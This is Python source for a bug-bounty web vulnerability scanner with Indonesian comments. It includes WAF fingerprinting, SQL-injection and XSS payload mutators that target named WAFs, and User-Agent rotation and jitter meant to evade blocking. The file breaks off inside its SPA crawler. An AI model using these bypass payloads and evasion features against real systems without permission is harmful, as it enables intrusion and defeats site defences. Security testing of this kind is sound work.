"""
╔══════════════════════════════════════════════════════════════════╗
║         VULNSCAN PRO  —  Bug Bounty Edition                     ║
║   aiohttp · asyncio.Lock · Async DNS · SQLite · Full Fix        ║
╚══════════════════════════════════════════════════════════════════╝

Perubahan terbaru (fix all architectural issues):
  [fix] asyncio.Lock untuk acquire_async (ganti threading.Lock)
  [fix] asyncio.open_connection untuk port scanner (no threads)
  [fix] asyncio.to_thread untuk SQLite I/O (non-blocking)
  [fix] async_playwright jika tersedia (true non-blocking SPA crawl)
  [fix] aiodns resolver di-reuse + DNS rate limiter (semaphore)
  [fix] IDOR: field-level verification, bukan hanya body similarity
  [fix] SQLi time-based: statistical baseline timing
  [fix] XXE: multipart/form-data + file upload vectors
  [fix] html.escape() di semua output HTML report
  [fix] User-Agent rotation + jitter pada rate limiter
  [fix] --aggressive flag untuk probe berbahaya (SSRF/XXE/file)
  [fix] --debug flag untuk stack trace & verbose logging
  [fix] --waf-bypass flag: paksa bypass meski WAF tidak terdeteksi
  [fix] --no-verify flag untuk SSL verification control
  [fix] JWT disclaimer: peringatan explicit "claims only, no sig verify"
  [new] AsyncGraphQLScanner: introspection + field fuzzing

Cara pakai:
  python vulnscan_v7.py https://target.com
  python vulnscan_v7.py https://target.com --waf-bypass
  python vulnscan_v7.py https://target.com --aggressive     # SSRF/XXE probes
  python vulnscan_v7.py https://target.com --debug          # verbose logging
  python vulnscan_v7.py https://target.com --no-verify      # skip SSL check
  python vulnscan_v7.py https://target.com --spa-crawl
  python vulnscan_v7.py https://target.com --resume scan.db
  python vulnscan_v7.py --demo

Dependensi:
  pip install aiohttp beautifulsoup4 pyyaml
  pip install aiodns          # opsional, async DNS
  pip install playwright && playwright install chromium
"""

import sys, os, re, ssl, json, time, socket, urllib.parse
import argparse, datetime, threading, difflib, asyncio, random
import hashlib, base64, html as html_lib, sqlite3, hmac as hmac_lib
import logging, traceback
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple, Set, Any
from enum import Enum

# ── aiohttp (wajib) ──────────────────────────────────────────────
try:
    import aiohttp
except ImportError:
    print("[!] pip install aiohttp"); sys.exit(1)

# ── BeautifulSoup (wajib) ────────────────────────────────────────
try:
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] pip install beautifulsoup4"); sys.exit(1)

# ── aiodns (opsional) ────────────────────────────────────────────
try:
    import aiodns
    AIODNS_OK = True
except ImportError:
    AIODNS_OK = False

# ── PyYAML (opsional) ────────────────────────────────────────────
try:
    import yaml
    YAML_OK = True
except ImportError:
    YAML_OK = False
    print("[!] pip install pyyaml  (Nuclei YAML engine disabled)")

# ── Playwright (opsional) ────────────────────────────────────────
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_OK = True
    PLAYWRIGHT_ASYNC = True
except ImportError:
    try:
        from playwright.sync_api import sync_playwright
        PLAYWRIGHT_OK = True
        PLAYWRIGHT_ASYNC = False
    except ImportError:
        PLAYWRIGHT_OK = False
        PLAYWRIGHT_ASYNC = False

# ── Global logger ────────────────────────────────────────────────
logger = logging.getLogger("vulnscan")
_LOG_HANDLER = logging.StreamHandler()
_LOG_HANDLER.setFormatter(logging.Formatter(
    "%(asctime)s [%(levelname)s] %(message)s", "%H:%M:%S"))
logger.addHandler(_LOG_HANDLER)
logger.setLevel(logging.WARNING)

# ─────────────────────────────────────────────
#  ANSI COLORS
# ─────────────────────────────────────────────
class C:
    RESET="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
    BLUE="\033[94m"; MAGENTA="\033[95m"; CYAN="\033[96m"
    WHITE="\033[97m"; BG_RED="\033[41m"; BG_MAG="\033[45m"

def r(t): return f"{C.RED}{t}{C.RESET}"
def g(t): return f"{C.GREEN}{t}{C.RESET}"
def y(t): return f"{C.YELLOW}{t}{C.RESET}"
def c(t): return f"{C.CYAN}{t}{C.RESET}"
def m(t): return f"{C.MAGENTA}{t}{C.RESET}"
def w(t): return f"{C.WHITE}{C.BOLD}{t}{C.RESET}"
def bold(t): return f"{C.BOLD}{t}{C.RESET}"
def dim(t):  return f"{C.DIM}{t}{C.RESET}"

# ── Prefix symbols for verbose output ────────────────────────────
p_info    = f"{C.CYAN}[*]{C.RESET}"
p_success = f"{C.GREEN}[+]{C.RESET}"
p_warn    = f"{C.YELLOW}[!]{C.RESET}"
p_error   = f"{C.RED}[-]{C.RESET}"

# ─────────────────────────────────────────────
#  DATA STRUCTURES
# ─────────────────────────────────────────────
class Severity(Enum):
    CRITICAL="CRITICAL"; HIGH="HIGH"; MEDIUM="MEDIUM"
    LOW="LOW"; INFO="INFO"

SEV_ICON  = {Severity.CRITICAL:"💀", Severity.HIGH:"🔴",
             Severity.MEDIUM:"🟡",   Severity.LOW:"🔵", Severity.INFO:"ℹ️ "}
SEV_COLOR = {
    Severity.CRITICAL: C.BG_RED+C.WHITE+C.BOLD,
    Severity.HIGH:     C.RED+C.BOLD,
    Severity.MEDIUM:   C.YELLOW+C.BOLD,
    Severity.LOW:      C.CYAN,
    Severity.INFO:     C.DIM,
}

@dataclass
class Finding:
    module:      str
    severity:    Severity
    title:       str
    description: str
    evidence:    str       = ""
    remediation: str       = ""
    cvss:        float     = 0.0
    cwe:         str       = ""
    endpoint:    str       = ""
    tags:        List[str] = field(default_factory=list)

    def to_dict(self):
        d = asdict(self)
        d["severity"] = self.severity.value
        return d

@dataclass
class ScanResult:
    target:      str
    start_time:  datetime.datetime
    end_time:    Optional[datetime.datetime] = None
    findings:    List[Finding]  = field(default_factory=list)
    server_info: Dict           = field(default_factory=dict)
    endpoints:   List[str]      = field(default_factory=list)
    subdomains:  List[str]      = field(default_factory=list)
    api_endpoints: List[dict]   = field(default_factory=list)
    waf_info:    Dict           = field(default_factory=dict)
    errors:      List[str]      = field(default_factory=list)
    completed_modules: List[str]= field(default_factory=list)
    # URLs discovered at runtime (param guesser, crawler) — persisted so
    # resume can re-populate urls_to_scan without re-running discovery.
    scan_queue_urls: List[str]  = field(default_factory=list)

    def add(self, f: Finding):
        key = f"{f.title}|{f.endpoint}"
        if key not in {f2.title+"|"+f2.endpoint for f2 in self.findings}:
            self.findings.append(f)

    def count_by_severity(self):
        counts = {s: 0 for s in Severity}
        for f in self.findings: counts[f.severity] += 1
        return counts

    @property
    def risk_score(self):
        wt = {Severity.CRITICAL:10, Severity.HIGH:7,
              Severity.MEDIUM:4,    Severity.LOW:1.5, Severity.INFO:0}
        return min(sum(wt[f.severity] for f in self.findings), 100.0)

    # ── SQLite checkpoint (robust, WAL mode) ─────────────────────
    def save_checkpoint_sqlite(self, db_path: str):
        """
        SQLite checkpoint — atomic upserts, WAL mode, crash-safe.
        Dipanggil via asyncio.to_thread() agar tidak block event loop.
        """
        conn = sqlite3.connect(db_path, timeout=10)
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA synchronous=NORMAL")
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS meta (
                key TEXT PRIMARY KEY, value TEXT NOT NULL);
            CREATE TABLE IF NOT EXISTS findings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                module TEXT, severity TEXT, title TEXT,
                description TEXT, evidence TEXT, remediation TEXT,
                cvss REAL, cwe TEXT, endpoint TEXT, tags TEXT,
                UNIQUE(title, endpoint));
            CREATE TABLE IF NOT EXISTS endpoints (url TEXT PRIMARY KEY);
            CREATE TABLE IF NOT EXISTS completed_modules (name TEXT PRIMARY KEY);
            CREATE TABLE IF NOT EXISTS api_endpoints (
                id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT UNIQUE);
        """)
        meta_rows = [
            ("target",      self.target),
            ("start_time",  self.start_time.isoformat()),
            ("server_info", json.dumps(self.server_info, ensure_ascii=False)),
            ("waf_info",    json.dumps(self.waf_info,    ensure_ascii=False)),
            ("errors",      json.dumps(self.errors,      ensure_ascii=False)),
            ("subdomains",  json.dumps(self.subdomains,  ensure_ascii=False)),
        ]
        conn.executemany(
            "INSERT OR REPLACE INTO meta(key,value) VALUES(?,?)", meta_rows)
        for f in self.findings:
            conn.execute(
                "INSERT OR IGNORE INTO findings "
                "(module,severity,title,description,evidence,"
                "remediation,cvss,cwe,endpoint,tags) VALUES(?,?,?,?,?,?,?,?,?,?)",
                (f.module, f.severity.value, f.title, f.description,
                 f.evidence, f.remediation, f.cvss or 0.0, f.cwe or "",
                 f.endpoint or "", json.dumps(f.tags or [])))
        conn.executemany(
            "INSERT OR IGNORE INTO endpoints(url) VALUES(?)",
            [(ep,) for ep in self.endpoints])
        for ep in self.api_endpoints:
            conn.execute("INSERT OR IGNORE INTO api_endpoints(data) VALUES(?)",
                         (json.dumps(ep, ensure_ascii=False),))
        conn.executemany(
            "INSERT OR IGNORE INTO completed_modules(name) VALUES(?)",
            [(mod,) for mod in self.completed_modules])
        # FIX 4: Tabel antrian scan — persistent queue untuk resume optimal
        conn.execute("""
            CREATE TABLE IF NOT EXISTS scan_queue (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT NOT NULL,
                module_hint TEXT DEFAULT '',
                status TEXT DEFAULT 'pending',
                UNIQUE(url, module_hint))
        """)
        # Enqueue newly discovered URLs as 'pending'
        if self.scan_queue_urls:
            conn.executemany(
                "INSERT OR IGNORE INTO scan_queue(url, module_hint, status) "
                "VALUES(?, '', 'pending')",
                [(u,) for u in self.scan_queue_urls])
        conn.commit()
        conn.close()

    def mark_queue_done_sqlite(self, db_path: str):
        """Mark all scan_queue items as done — called once scan finishes."""
        if not os.path.exists(db_path): return
        try:
            conn = sqlite3.connect(db_path, timeout=10)
            conn.execute("UPDATE scan_queue SET status='done' WHERE status='pending'")
            conn.commit()
            conn.close()
        except Exception as e:
            logger.debug(f"mark_queue_done error: {e}")

    @classmethod
    def load_checkpoint_sqlite(cls, db_path: str) -> Optional["ScanResult"]:
        if not os.path.exists(db_path): return None
        try:
            conn = sqlite3.connect(db_path, timeout=5)
            meta = dict(conn.execute("SELECT key,value FROM meta").fetchall())
            if not meta.get("target"):
                conn.close(); return None
            result = cls(
                target=meta["target"],
                start_time=datetime.datetime.fromisoformat(
                    meta.get("start_time", datetime.datetime.now().isoformat())))
            result.server_info = json.loads(meta.get("server_info","{}"))
            result.waf_info    = json.loads(meta.get("waf_info","{}"))
            result.errors      = json.loads(meta.get("errors","[]"))
            result.subdomains  = json.loads(meta.get("subdomains","[]"))
            sev_map = {s.value: s for s in Severity}
            for row in conn.execute(
                    "SELECT module,severity,title,description,evidence,"
                    "remediation,cvss,cwe,endpoint,tags FROM findings").fetchall():
                result.findings.append(Finding(
                    module=row[0], severity=sev_map.get(row[1], Severity.INFO),
                    title=row[2], description=row[3], evidence=row[4] or "",
                    remediation=row[5] or "", cvss=float(row[6] or 0),
                    cwe=row[7] or "", endpoint=row[8] or "",
                    tags=json.loads(row[9] or "[]")))
            result.endpoints = [
                r[0] for r in conn.execute("SELECT url FROM endpoints").fetchall()]
            result.api_endpoints = [
                json.loads(r[0]) for r in conn.execute(
                    "SELECT data FROM api_endpoints").fetchall()]
            result.completed_modules = [
                r[0] for r in conn.execute(
                    "SELECT name FROM completed_modules").fetchall()]
            # FIX 4 (read side): muat kembali URL yang belum diproses dari antrian
            try:
                pending = conn.execute(
                    "SELECT url FROM scan_queue WHERE status='pending'"
                ).fetchall()
                result.scan_queue_urls = [row[0] for row in pending]
            except Exception:
                result.scan_queue_urls = []  # tabel belum ada di checkpoint lama
            conn.close()
            return result
        except Exception as e:
            logger.warning(f"load_checkpoint failed: {e}")
            return None

# ─────────────────────────────────────────────
#  SIMILARITY ENGINE
# ─────────────────────────────────────────────
class Sim:
    DYNAMIC_PATTERNS = [
        r'<input[^>]+type=["\']hidden["\'][^>]*>',
        r'value=["\'][a-zA-Z0-9+/=]{20,}["\']',
        r'\b\d{10,13}\b', r'[0-9a-f]{32,}',
        r'<!--.*?-->', r'<script[\s\S]*?</script>',
        r'<style[\s\S]*?</style>',
    ]
    ERROR_SIGNALS = [
        (r"sql syntax.*mysql",     "MySQL Error"),
        (r"warning.*mysql_",       "MySQL Warn"),
        (r"ora-\d{5}",            "Oracle Error"),
        (r"postgresql.*error",     "PG Error"),
        (r"sqlite.*error",         "SQLite Error"),
        (r"unclosed quotation",    "Quote Error"),
        (r"microsoft.*ole db",     "ODBC Error"),
        (r"traceback.*most recent","Python TB"),
        (r"fatal error.*php",      "PHP Error"),
        (r"exception in thread",   "Java Exception"),
        (r"<script.*alert\s*\(",  "Script Reflected"),
        (r"onerror\s*=\s*alert",  "Handler Reflected"),
        (r"onload\s*=\s*alert",   "Onload Reflected"),
    ]

    @staticmethod
    def strip_dynamic(html_str: str) -> str:
        result = html_str.lower()
        for pat in Sim.DYNAMIC_PATTERNS:
            result = re.sub(pat, ' ', result, flags=re.I|re.S)
        return re.sub(r'\s+', ' ', result).strip()

    @staticmethod
    def ratio(a: str, b: str) -> float:
        if not a and not b: return 1.0
        if not a or not b:  return 0.0
        return difflib.SequenceMatcher(
            None, Sim.strip_dynamic(a), Sim.strip_dynamic(b),
            autojunk=False).ratio()

    @staticmethod
    def find_reflection(payload: str, body: str, window: int = 200) -> Optional[str]:
        bl = body.lower(); pl = payload.lower()
        idx = bl.find(pl)
        if idx == -1:
            try: idx = bl.find(urllib.parse.unquote(payload).lower())
            except: pass
        if idx == -1: return None
        return body[max(0,idx-window): min(len(body), idx+len(payload)+window)]

    @staticmethod
    def diff(baseline: str, test: str, payload: str = "") -> dict:
        bc = Sim.strip_dynamic(baseline)
        tc = Sim.strip_dynamic(test)
        sim = difflib.SequenceMatcher(None, bc, tc, autojunk=False).ratio()
        ctx = Sim.find_reflection(payload, test) if payload else None
        scan = ctx if ctx else "\n".join(
            set(test.lower().split('\n')) - set(baseline.lower().split('\n')))
        signals = [lbl for pat,lbl in Sim.ERROR_SIGNALS
                   if re.search(pat, scan, re.I)]
        reflected  = ctx is not None
        confidence = "NONE"
        if reflected and signals:
            confidence = "CONFIRMED" if sim < 0.90 else "HIGH"
        elif signals and sim < 0.80: confidence = "HIGH"
        elif signals and sim < 0.92: confidence = "MEDIUM"
        elif reflected and sim < 0.75: confidence = "LOW"
        elif not reflected and sim < 0.70: confidence = "LOW"
        return {"sim":sim, "len_diff":abs(len(test)-len(baseline)),
                "signals":signals, "confidence":confidence,
                "reflected":reflected,
                "reflection_context": ctx[:150] if ctx else None}

# ─────────────────────────────────────────────
#  RATE LIMITER  — fix: asyncio.Lock + jitter
# ─────────────────────────────────────────────
class RateLimiter:
    THROTTLE_THRESHOLD = 3
    THROTTLE_FACTOR    = 0.5
    RECOVERY_FACTOR    = 1.2
    RECOVERY_STREAK    = 10
    JITTER_MAX         = 0.15  # max seconds of random jitter

    def __init__(self, rps: float = 10.0):
        self.rps_max    = rps
        self.rps        = rps
        self.rps_min    = 1.0
        self.tokens     = rps
        self.last       = time.time()
        # sync path (SPA crawler thread) uses threading.Lock
        self._tlock     = threading.Lock()
        # FIX 1: asyncio.Lock dibuat di __init__ — tidak ada lazy init,
        # tidak ada race condition jika dua coroutine masuk bersamaan
        self._alock     = asyncio.Lock()
        self._errors    = 0
        self._successes = 0

    # ── sync path (used only by SPACrawler thread) ───────────────
    def acquire(self):
        with self._tlock:
            now = time.time()
            self.tokens += (now - self.last) * self.rps
            self.last    = now
            if self.tokens > self.rps: self.tokens = self.rps
            if self.tokens < 1.0:
                time.sleep((1.0 - self.tokens) / self.rps)
                self.tokens = 0.0
            else:
                self.tokens -= 1.0

    # ── async path — uses asyncio.Lock, never blocks event loop ──
    async def acquire_async(self):
        """
        FIX: Gunakan asyncio.Lock (bukan threading.Lock) agar tidak
        pernah memblokir event loop. Jitter random mencegah pola
        request yang mudah dikenali/diblokir rate limiter target.
        """
        while True:
            async with self._alock:
                now = time.time()
                self.tokens += (now - self.last) * self.rps
                self.last    = now
                if self.tokens > self.rps: self.tokens = self.rps
                if self.tokens >= 1.0:
                    self.tokens -= 1.0
                    wait = 0.0
                else:
                    wait = (1.0 - self.tokens) / self.rps
            if wait <= 0:
                # Jitter: tambahkan delay acak kecil
                jitter = random.uniform(0, self.JITTER_MAX)
                if jitter > 0.005:
                    await asyncio.sleep(jitter)
                return
            await asyncio.sleep(wait)

    def report_success(self):
        with self._tlock:
            self._errors     = 0
            self._successes += 1
            if self._successes >= self.RECOVERY_STREAK:
                self._successes = 0
                new_rps = min(self.rps * self.RECOVERY_FACTOR, self.rps_max)
                if new_rps > self.rps:
                    self.rps    = new_rps
                    self.tokens = min(self.tokens, self.rps)

    def report_error(self):
        with self._tlock:
            self._successes = 0
            self._errors   += 1
            if self._errors >= self.THROTTLE_THRESHOLD:
                self._errors = 0
                new_rps = max(self.rps * self.THROTTLE_FACTOR, self.rps_min)
                if new_rps < self.rps:
                    self.rps    = new_rps
                    self.tokens = min(self.tokens, self.rps)

# ─────────────────────────────────────────────
#  USER-AGENT POOL (rotasi per request)
# ─────────────────────────────────────────────
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
]

def random_ua() -> str:
    return random.choice(UA_POOL)

# ─────────────────────────────────────────────
#  ASYNC ENGINE — full aiohttp, UA rotation
# ─────────────────────────────────────────────
class AsyncEngine:
    """
    Full aiohttp engine.
    - UA rotation per request (harder to fingerprint/block)
    - asyncio.Lock-based rate limiting (no event loop blocking)
    - Optional ssl verification via verify_ssl flag
    """
    def __init__(self, max_workers: int = 20, rps: float = 10.0,
                 login_url: str = None, username: str = None,
                 password: str = None, verify_ssl: bool = False,
                 cacert: str = None, bearer_token: str = None):
        self.workers      = max_workers
        self._stats       = {"total":0,"success":0,"error":0,"t0":time.time()}
        self._session: Optional[aiohttp.ClientSession] = None
        self._rate        = RateLimiter(rps)
        self.login_url    = login_url
        self.username     = username
        self.password     = password
        self.verify_ssl   = verify_ssl
        # FIX 12: Custom CA bundle support
        self.cacert       = cacert
        # FIX 14: Bearer token — disisipkan ke setiap request
        self.bearer_token = bearer_token
        self._ready       = False
        # ssl context — FIX 12: cacert overrides verify_ssl if provided
        if cacert:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.load_verify_locations(cacert)
            self._ssl: Any = ctx
        elif verify_ssl:
            self._ssl = None  # aiohttp default (verify with system CA)
        else:
            self._ssl = False  # skip verify

    async def _ensure_ready(self):
        if self._ready: return
        connector = aiohttp.TCPConnector(
            ssl=self._ssl, limit=self.workers, limit_per_host=10,
            ttl_dns_cache=300, use_dns_cache=True,
            enable_cleanup_closed=True)
        timeout = aiohttp.ClientTimeout(total=12, connect=5, sock_read=10)
        self._session = aiohttp.ClientSession(
            connector=connector,
            headers={"Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                     "Accept-Encoding": "gzip, deflate"},
            timeout=timeout,
            cookie_jar=aiohttp.CookieJar(unsafe=True),
            connector_owner=True)
        if self.login_url and self.username and self.password:
            await self._login()
        self._ready = True

    async def _login(self):
        try:
            async with self._session.get(self.login_url, ssl=self._ssl) as r0:
                html_text = await r0.text(errors="replace")
            soup  = BeautifulSoup(html_text, "html.parser")
            csrf  = ""
            for name in ["_token","csrf_token","authenticity_token"]:
                inp = soup.find("input", {"name": re.compile(name, re.I)})
                if inp: csrf = inp.get("value",""); break
            u_f, p_f = "username", "password"
            for inp in soup.find_all("input"):
                iname = (inp.get("name") or "").lower()
                itype = (inp.get("type") or "").lower()
                if itype in ("email","text") or "user" in iname:
                    u_f = inp.get("name", u_f)
                if itype == "password":
                    p_f = inp.get("name", p_f)
            data = {u_f: self.username, p_f: self.password}
            if csrf: data["_token"] = csrf
            async with self._session.post(
                    self.login_url, data=data, ssl=self._ssl) as _: pass
        except Exception as e:
            logger.debug(f"Login failed: {e}")

    def _headers(self, extra: dict = None) -> dict:
        """UA rotation — tiap request pakai browser string berbeda.
        FIX 14: Sisipkan Bearer token jika tersedia."""
        h = {"User-Agent": random_ua()}
        if self.bearer_token:
            h["Authorization"] = f"Bearer {self.bearer_token}"
        if extra: h.update(extra)
        return h

    async def get(self, url, params=None, headers=None, allow_redirects=True):
        await self._ensure_ready()
        await self._rate.acquire_async()
        try:
            async with self._session.get(
                    url, params=params,
                    headers=self._headers(headers),
                    allow_redirects=allow_redirects,
                    ssl=self._ssl) as resp:
                body = await resp.text(errors="replace")
                self._stats["total"]   += 1
                self._stats["success"] += 1
                self._rate.report_success()
                return {"status":    resp.status,
                        "headers":   dict(resp.headers),
                        "body":      body,
                        "final_url": str(resp.url),
                        "cookies":   {k: v for k,v in resp.cookies.items()}}
        except Exception as e:
            logger.debug(f"GET {url}: {e}")
            self._stats["error"] += 1
            self._rate.report_error()
            return None

    async def post(self, url, data=None, headers=None):
        await self._ensure_ready()
        await self._rate.acquire_async()
        h = self._headers(headers)
        try:
            kw: Dict[str, Any] = {}
            if data is not None:
                if isinstance(data, str):
                    raw = data.encode("utf-8")
                    kw["data"] = raw
                    ct = ("application/xml"
                          if data.lstrip().startswith(("<?xml","<!"))
                          else "application/x-www-form-urlencoded")
                    h.setdefault("Content-Type", ct)
                elif isinstance(data, dict):
                    kw["data"] = aiohttp.FormData(data)
                else:
                    kw["data"] = data
            async with self._session.post(
                    url, headers=h, ssl=self._ssl, **kw) as resp:
                body = await resp.text(errors="replace")
                self._stats["total"]   += 1
                self._stats["success"] += 1
                self._rate.report_success()
                return {"status":    resp.status,
                        "headers":   dict(resp.headers),
                        "body":      body,
                        "final_url": str(resp.url),
                        "cookies":   {}}
        except Exception as e:
            logger.debug(f"POST {url}: {e}")
            self._stats["error"] += 1
            self._rate.report_error()
            return None

    async def gather(self, coros: list) -> list:
        sem = asyncio.Semaphore(self.workers)
        async def bounded(co):
            async with sem: return await co
        results = await asyncio.gather(
            *[bounded(co) for co in coros], return_exceptions=True)
        return [x for x in results if not isinstance(x, Exception)]

    def rps(self):
        el = time.time() - self._stats["t0"]
        return self._stats["total"] / max(el, 0.1)

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()

# ─────────────────────────────────────────────
#  WAF DETECTOR
# ─────────────────────────────────────────────
class WAFDetector:
    NAME = "WAF Detector"
    SIGNATURES = {
        "Cloudflare": {
            "headers": ["cf-ray","cf-cache-status","__cfduid"],
            "body":    [r"cloudflare", r"attention required.*cloudflare",
                        r"ray id:", r"error 1020"],
            "server":  [r"cloudflare"],
        },
        "AWS WAF": {
            "headers": ["x-amzn-requestid","x-amz-cf-id"],
            "body":    [r"aws waf", r"request blocked"],
            "server":  [],
        },
        "Akamai": {
            "headers": ["akamai-grn","x-akamai-transformed"],
            "body":    [r"access denied.*akamai", r"reference #\d+\.\d+"],
            "server":  [r"akamai"],
        },
        "ModSecurity": {
            "headers": ["x-mod-security"],
            "body":    [r"mod_security", r"modsecurity", r"not acceptable!",
                        r"this error.*generated by"],
            "server":  [],
        },
        "Imperva/Incapsula": {
            "headers": ["x-iinfo","incap_ses","visid_incap"],
            "body":    [r"incapsula incident id"],
            "server":  [r"imperva"],
        },
        "Sucuri": {
            "headers": ["x-sucuri-id","x-sucuri-cache"],
            "body":    [r"sucuri website firewall"],
            "server":  [r"sucuri"],
        },
        "F5 BIG-IP": {
            "headers": ["x-cnection"],
            "body":    [r"the requested url was rejected", r"f5 big.?ip"],
            "server":  [r"big-ip"],
        },
        "Nginx WAF": {
            "headers": [],
            "body":    [r"nginx.*403", r"403 forbidden.*nginx"],
            "server":  [r"nginx"],
        },
    }

    async def detect(self, engine: AsyncEngine, url: str,
                     result: ScanResult) -> dict:
        waf_info = {"detected":False,"name":None,"confidence":0,
                    "bypass_strategy":"standard"}
        normal = await engine.get(url)
        attack = await engine.get(url+"?vulnscan=<script>alert(1)</script>'\";--")
        if not normal: return waf_info
        all_headers = {k.lower(): v.lower()
                       for k,v in normal["headers"].items()}
        server_hdr  = normal["headers"].get("Server","").lower()
        bodies = [(normal["body"] or "").lower(),
                  (attack["body"] if attack else "").lower()]
        if attack and attack["status"] in (403,406,429,503):
            waf_info["confidence"] += 20
        for waf_name, sigs in self.SIGNATURES.items():
            score = 0
            for h in sigs["headers"]:
                if h.lower() in all_headers: score += 30
            for body in bodies:
                for pat in sigs["body"]:
                    if re.search(pat, body, re.I): score += 25
            for pat in sigs["server"]:
                if re.search(pat, server_hdr, re.I): score += 20
            if score > 0:
                waf_info.update({"detected":True,"name":waf_name,
                    "confidence":min(score,100),
                    "bypass_strategy":self._strategy(waf_name)})
                break
        result.waf_info = waf_info
        if waf_info["detected"]:
            result.add(Finding(WAFDetector.NAME, Severity.INFO,
                f"WAF Terdeteksi: {waf_info['name']}",
                "WAF aktif — payload akan di-mutasi otomatis.",
                f"WAF: {waf_info['name']} | Confidence: {waf_info['confidence']}%\n"
                f"Bypass: {waf_info['bypass_strategy']}",
                "WAF bukan alasan untuk tidak fix kerentanan.",
                0,"",url,["waf"]))
        return waf_info

    def _strategy(self, waf_name: str) -> str:
        return {"Cloudflare":"case_mutation+unicode",
                "ModSecurity":"comment_injection+double_encode",
                "AWS WAF":"hex_encode+whitespace",
                "Akamai":"case_mutation+hex_encode",
                "Imperva/Incapsula":"double_encode+comment_injection",
                "Sucuri":"case_mutation+unicode",
                "F5 BIG-IP":"comment_injection+hex_encode",
                "Nginx WAF":"double_encode"}.get(waf_name,"standard")

# ─────────────────────────────────────────────
#  PAYLOAD MUTATOR
# ─────────────────────────────────────────────
class PayloadMutator:
    @staticmethod
    def mutate_sqli(payload: str, strategy: str) -> List[str]:
        variants = [payload]
        if "comment_injection" in strategy:
            variants.append(payload.replace(" ","/**/"))
            variants.append(payload.replace("SELECT","/*!50001SELECT*/")
                                   .replace("UNION","UN/**/ION"))
        if "case_mutation" in strategy:
            variants.append("".join(ch.upper() if i%2==0 else ch.lower()
                                    for i,ch in enumerate(payload)))
        if "double_encode" in strategy:
            variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
            variants.append(urllib.parse.quote(payload))
        if "hex_encode" in strategy:
            variants.append(payload.replace("'","0x27").replace('"',"0x22"))
        if "whitespace" in strategy:
            variants += [payload.replace(" ","\t"),
                         payload.replace(" ","\n"),
                         payload.replace(" ","%0a")]
        return list(dict.fromkeys(variants))

    @staticmethod
    def mutate_xss(payload: str, strategy: str) -> List[str]:
        variants = [payload]
        if "case_mutation" in strategy:
            variants.append(payload.replace("<script>","<ScRiPt>")
                                   .replace("</script>","</ScRiPt>"))
        if "unicode" in strategy:
            variants.append(payload.replace(
                "alert","\\u0061\\u006c\\u0065\\u0072\\u0074"))
        if "double_encode" in strategy:
            variants += [urllib.parse.quote(payload),
                         urllib.parse.quote(urllib.parse.quote(payload))]
        if "comment_injection" in strategy:
            variants += [payload.replace("alert","al\u0065rt"),
                         "<svg/onload=alert`1`>"]
        variants += ["<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
                     "<svg><script>alert&#40;1&#41;</script>",
                     "javas\tcript:alert(1)"]
        return list(dict.fromkeys(variants))

    @staticmethod
    def is_blocked(resp: dict) -> bool:
        if not resp: return True
        if resp.get("status") in (403,406,429,503): return True
        body = resp.get("body","").lower()
        return any(s in body for s in [
            "access denied","blocked","forbidden","not acceptable",
            "request rejected","security violation","waf","firewall"])

# ─────────────────────────────────────────────
#  SPA CRAWLER — fix: async_playwright preferred
# ─────────────────────────────────────────────
class SPACrawler:
    """
    FIX: Gunakan async_playwright jika tersedia (true non-blocking).
    Fallback ke sync_playwright di thread jika async tidak tersedia.
    """
    NAME = "SPA Crawler"
    PAGE_TIMEOUT    = 12000
    NETWORK_TIMEOUT = 3000

    def __init__(self, max_pages: int = 20):
        self.max_pages = max_pages

    async def run_async(self, url: str, result: ScanResult,
                        js_events: bool = True):
        if not PLAYWRIGHT_OK:
            result.errors.append("SPA Crawler: Playwright tidak tersedia")
            return
        if PLAYWRIGHT_ASYNC:
            await self._crawl_async(url, result, js_events)
        else:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(
                None, lambda: self._crawl_sync(url, result, js_events))

    async def _crawl_async(self, url: str, result: ScanResult,
                           js_events: bool):
        """True async crawl via playwright.async_api — tidak blocking."""
        domain     = urllib.parse.urlparse(url).netloc
        api_calls: List[dict] = []
        found_urls: Set[str]  = set()

        try:
            async with async_playwright() as pw:
                browser = await pw.chromium.launch(
                    headless=True,
                    args=["--no-sandbox","--disable-dev-shm-usage",
                          "--disable-gpu","--disable-extensions",
                          "--memory-pressure-off"])
                ctx = await browser.new_context(
                    ignore_https_errors=True,
                    user_agent=random_ua(),
                    extra_http_headers={"Accept-Encoding":"gzip, deflate"})
                await ctx.route(
                    "**/*.{png,jpg,jpeg,gif,webp,svg,ico,woff,woff2,ttf,eot}",
                    lambda route, _: route.abort())

